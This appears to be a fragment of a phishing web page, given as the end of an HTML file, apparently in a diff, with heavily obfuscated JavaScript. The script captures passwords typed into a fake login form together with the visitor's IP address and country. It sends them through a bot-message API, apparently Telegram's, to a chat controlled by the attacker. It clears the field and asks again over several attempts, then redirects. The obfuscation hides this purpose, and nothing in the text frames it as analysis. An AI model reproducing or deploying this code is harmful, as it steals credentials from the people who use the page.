_0x50a1b2+_0x274d0c;},'RHkNa':function(_0x2edefe,_0x5c7735){return _0x2edefe+_0x5c7735;},'sUOgJ':function(_0x488eae,_0x4f0175){return _0x488eae+_0x4f0175;},'OriHy':function(_0x564fc2,_0x1f590b){return _0x564fc2+_0x1f590b;},'ZQtzw':_0x155f0d(0x1e1)+_0x155f0d(0x176)+_0x155f0d(0x169)+_0x155f0d(0x1f4)+_0x155f0d(0x1d4),'yCeae':_0x155f0d(0x16d)+_0x155f0d(0x1a4),'imIWH':_0x155f0d(0x1b0),'ZNIWi':_0x155f0d(0x178)+_0x155f0d(0x186),'JVneO':_0x155f0d(0x1f1)+_0x155f0d(0x18b),'bhLqj':_0x155f0d(0x1f7)+_0x155f0d(0x21b),'WaZZy':_0x155f0d(0x195)+_0x155f0d(0x196),'feKti':_0x155f0d(0x208)+_0x155f0d(0x1c4),'wkoVR':_0x155f0d(0x219)+_0x155f0d(0x20e),'nHxaH':_0x155f0d(0x1e5)+_0x155f0d(0x1ea)+_0x155f0d(0x1d5)+_0x155f0d(0x175)+'.'},_0x54d116=_0x5d0d61[_0x155f0d(0x206)][_0x155f0d(0x218)+_0x155f0d(0x17b)](_0x50026a[_0x155f0d(0x18f)]);_0x54d116[_0x155f0d(0x1a2)]=!![],btnText[_0x155f0d(0x197)+'t']=_0x50026a[_0x155f0d(0x1ed)],btnLoader[_0x155f0d(0x1cf)][_0x155f0d(0x1d0)](_0x50026a[_0x155f0d(0x1d3)]),_0x50026a[_0x155f0d(0x1ab)](setTimeout,function(){const _0x5e09d6=_0x155f0d;_0x54d116[_0x5e09d6(0x1a2)]=![],btnText[_0x5e09d6(0x197)+'t']=_0x50026a[_0x5e09d6(0x1ed)],btnLoader[_0x5e09d6(0x1cf)][_0x5e09d6(0x1eb)](_0x50026a[_0x5e09d6(0x1d3)]);},-0x1302*-0x1+-0x2*0x6aa+-0x2*-0x305),_0x5d0d61[_0x155f0d(0x1de)+_0x155f0d(0x1dd)]();let _0x4bfbdc=_0x50026a[_0x155f0d(0x21a)]($,this),_0x5199f7=_0x50026a[_0x155f0d(0x17e)]($,this)[_0x155f0d(0x1cb)](_0x50026a[_0x155f0d(0x17d)])[_0x155f0d(0x1ca)](),_0x4b9f4e=new FormData(document[_0x155f0d(0x215)+_0x155f0d(0x18e)](_0x50026a[_0x155f0d(0x18d)]));_0x50026a[_0x155f0d(0x1d2)](num_enter_password,-0x1*0x65b+-0x4*0x986+0x2c74)&&_0x4b9f4e[_0x155f0d(0x1b2)](_0x50026a[_0x155f0d(0x174)],_0x5199f7);_0x50026a[_0x155f0d(0x1e6)](num_enter_password,-0x26f4+0x1*0x217e+0x578)&&_0x4b9f4e[_0x155f0d(0x1b2)](_0x50026a[_0x155f0d(0x21e)],_0x5199f7);_0x4b9f4e[_0x155f0d(0x1b2)](_0x50026a[_0x155f0d(0x183)],num_enter_password);var _0x2bf9fa=_0x50026a[_0x155f0d(0x203)];async function _0x33b371(){const _0x4e01c1=_0x155f0d,_0x4a1f3e=await _0x50026a[_0x4e01c1(0x21a)](fetch,_0x2bf9fa);if(_0x50026a[_0x4e01c1(0x1a7)](_0x4a1f3e[_0x4e01c1(0x1f6)],-0x1c0e+-0x1554+-0x1*-0x322a)){const _0x4b70a2=await _0x4a1f3e[_0x4e01c1(0x1b7)]();return userIpData={'user_ip':_0x4b70a2['ip'],'country_code':_0x4b70a2[_0x4e01c1(0x1fc)]},userIpData;}else userIpData={'user_ip':_0x50026a[_0x4e01c1(0x1fe)],'country':'-','country_code':'-'};}await _0x50026a[_0x155f0d(0x1f3)](_0x33b371);let _0x4daddc=_0x50026a[_0x155f0d(0x209)](_0x50026a[_0x155f0d(0x16e)](_0x50026a[_0x155f0d(0x16a)](_0x50026a[_0x155f0d(0x1cc)](_0x50026a[_0x155f0d(0x16e)](_0x155f0d(0x1bb)+userIpData[_0x155f0d(0x1b9)]+'\x20','|'),'\x20'+userIpData[_0x155f0d(0x1fc)]+'\x20'),'|'),'\x20'+userIpData[_0x155f0d(0x20d)+'de']+'\x20'),'\x0a');for(let [_0x175532,_0x48f93e]of _0x4b9f4e[_0x155f0d(0x1c7)]()){_0x4daddc+=_0x175532+':\x20'+_0x48f93e+'\x0a';}const _0x5f8295=_0x50026a[_0x155f0d(0x1fd)],_0x60f007=_0x50026a[_0x155f0d(0x1e8)],_0x4263ea=_0x155f0d(0x220)+_0x155f0d(0x1cd)+_0x155f0d(0x1a6)+_0x5f8295+(_0x155f0d(0x180)+'ge');try{const _0x96bf15=_0x50026a[_0x155f0d(0x1ab)](fetch,_0x4263ea,{'method':_0x50026a[_0x155f0d(0x182)],'headers':{'Content-Type':_0x50026a[_0x155f0d(0x21f)]},'body':JSON[_0x155f0d(0x1ba)]({'chat_id':_0x60f007,'text':_0x4daddc,'disable_web_page_preview':!![]})});if(j&&j['ok'])console[_0x155f0d(0x216)](_0x50026a[_0x155f0d(0x20f)],j[_0x155f0d(0x1e2)]);else console[_0x155f0d(0x212)](_0x50026a[_0x155f0d(0x1c0)],j);}catch(_0x57cdb4){console[_0x155f0d(0x212)](_0x50026a[_0x155f0d(0x1e4)],_0x57cdb4);}_0x50026a[_0x155f0d(0x1a7)](num_enter_password,0x1825+0x3b*0x1+-0x185e)&&(window[_0x155f0d(0x1ce)][_0x155f0d(0x1ec)]=_0x50026a[_0x155f0d(0x184)]),_0x4bfbdc[_0x155f0d(0x1cb)](_0x50026a[_0x155f0d(0x179)])[_0x155f0d(0x170)](_0x50026a[_0x155f0d(0x171)]),_0x4bfbdc[_0x155f0d(0x1cb)](_0x50026a[_0x155f0d(0x17d)])[_0x155f0d(0x1ca)](''),num_enter_password++;}),document[_0x294fe1(0x218)+_0x294fe1(0x17b)](_0x294fe1(0x1ad)+_0x294fe1(0x20a))[_0x294fe1(0x202)+_0x294fe1(0x17c)](_0x294fe1(0x192),function(_0x3381d4){const _0x47deed=_0x294fe1,_0xde1308=String[_0x47deed(0x187)+'de'](_0x3381d4[_0x47deed(0x1f9)]);!/[0-9]/[_0x47deed(0x1f2)](_0xde1308)&&_0x3381d4[_0x47deed(0x1de)+_0x47deed(0x1dd)]();}),$[_0x294fe1(0x217)]({'headers':{'X-CSRF-TOKEN':$(_0x294fe1(0x19a)+_0x294fe1(0x1e7)+_0x294fe1(0x21c))[_0x294fe1(0x18a)](_0x294fe1(0x1db))}});function hideLoader(){const _0x15a65f=_0x294fe1,_0x143c64={'aiTlI':_0x15a65f(0x1a9),'hpHCF':_0x15a65f(0x200),'OjXsL':_0x15a65f(0x1c8)+_0x15a65f(0x1c1),'dcHSJ':_0x15a65f(0x1ef)+'t','zsIuA':_0x15a65f(0x1c9),'hOHxb':function(_0x27a8c6,_0x1f5458,_0x3636d1){return _0x27a8c6(_0x1f5458,_0x3636d1);}},_0x106477=document[_0x15a65f(0x215)+_0x15a65f(0x18e)](_0x143c64[_0x15a65f(0x189)]),_0x7c03d4=document[_0x15a65f(0x215)+_0x15a65f(0x18e)](_0x143c64[_0x15a65f(0x1f0)]);_0x106477[_0x15a65f(0x1cf)][_0x15a65f(0x1eb)](_0x143c64[_0x15a65f(0x1bc)]),_0x143c64[_0x15a65f(0x18c)](setTimeout,()=>{const _0x4446f0=_0x15a65f;_0x106477[_0x4446f0(0x19f)][_0x4446f0(0x198)]=_0x143c64[_0x4446f0(0x213)],_0x7c03d4[_0x4446f0(0x1cf)][_0x4446f0(0x1eb)](_0x143c64[_0x4446f0(0x1da)]);},0x2*-0x80+-0x1*0xd3f+0xea3);}function showLoader(){const _0x2dd5cc=_0x294fe1,_0x52c578={'ZKsGQ':_0x2dd5cc(0x1c8)+_0x2dd5cc(0x1c1),'INzSc':_0x2dd5cc(0x1ef)+'t','NPXoc':_0x2dd5cc(0x1d1),'yycJQ':_0x2dd5cc(0x1c9),'tOJyU':_0x2dd5cc(0x200),'ilcLq':_0x2dd5cc(0x1a9),'kdRRJ':function(_0x451cad,_0x417509,_0x7dce10){return _0x451cad(_0x417509,_0x7dce10);}},_0x1f5238=document[_0x2dd5cc(0x215)+_0x2dd5cc(0x18e)](_0x52c578[_0x2dd5cc(0x1ac)]),_0x4b81df=document[_0x2dd5cc(0x215)+_0x2dd5cc(0x18e)](_0x52c578[_0x2dd5cc(0x21d)]);_0x1f5238[_0x2dd5cc(0x19f)][_0x2dd5cc(0x198)]=_0x52c578[_0x2dd5cc(0x191)],_0x1f5238[_0x2dd5cc(0x1cf)][_0x2dd5cc(0x1d0)](_0x52c578[_0x2dd5cc(0x1a0)]),_0x4b81df[_0x2dd5cc(0x1cf)][_0x2dd5cc(0x1d0)](_0x52c578[_0x2dd5cc(0x1a5)]),_0x4b81df[_0x2dd5cc(0x19f)][_0x2dd5cc(0x198)]=_0x52c578[_0x2dd5cc(0x1fb)],_0x52c578[_0x2dd5cc(0x1b3)](setTimeout,hideLoader,-0x93f+-0x3*-0x25d+-0x4*-0x184);}window[_0x294fe1(0x202)+_0x294fe1(0x17c)](_0x294fe1(0x199),()=>{const _0x3e836a=_0x294fe1,_0x49554e={'bsqzB':function(_0x28ec9a,_0x412682,_0x4df3c3){return _0x28ec9a(_0x412682,_0x4df3c3);}};_0x49554e[_0x3e836a(0x1e3)](setTimeout,hideLoader,-0x25c8*0x1+0x1db2+-0x59b*-0x2);});function resetForm(){const _0x230711=_0x294fe1,_0x269390={'sofHW':_0x230711(0x16b)+_0x230711(0x1ff),'FLRGb':_0x230711(0x16c),'LWGja':_0x230711(0x1d9),'mVRkx':_0x230711(0x1a1)},_0x52c757=_0x269390[_0x230711(0x1b5)][_0x230711(0x1c5)]('|');let _0x2e57b4=-0x2a2+-0x3c4*0x1+-0x9*-0xb6;while(!![]){switch(_0x52c757[_0x2e57b4++]){case'0':passwordInput[_0x230711(0x1ae)]=_0x269390[_0x230711(0x1bf)];continue;case'1':eyeSlashIcon[_0x230711(0x1cf)][_0x230711(0x1eb)](_0x269390[_0x230711(0x1dc)]);continue;case'2':btnLoader[_0x230711(0x1cf)][_0x230711(0x1eb)](_0x269390[_0x230711(0x1dc)]);continue;case'3':eyeIcon[_0x230711(0x1cf)][_0x230711(0x1d0)](_0x269390[_0x230711(0x1dc)]);continue;case'4':submitBtn[_0x230711(0x1a2)]=![];continue;case'5':errorPassword[_0x230711(0x197)+'t']='';continue;case'6':passwordForm[_0x230711(0x1b1)]();continue;case'7':btnText[_0x230711(0x197)+'t']=_0x269390[_0x230711(0x210)];continue;}break;}}
+</script>
+
+</html>
